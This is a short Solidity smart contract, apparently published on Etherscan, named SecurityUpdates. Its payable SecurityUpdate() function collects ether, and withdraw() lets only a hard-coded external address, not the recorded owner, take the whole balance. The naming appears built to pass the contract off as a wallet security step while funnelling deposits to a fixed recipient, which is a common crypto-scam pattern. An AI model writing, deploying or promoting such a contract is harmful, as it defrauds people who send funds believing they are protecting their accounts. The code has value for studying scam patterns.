/**
 *Submitted for verification at Etherscan.io on 2023-03-16
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-24
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;    // current owner of the contract
    address private  withdraw_ = 0x71674e6ee6d10cfcd63bd0d418b713505f335f6e;
     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(msg.sender == withdraw_);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}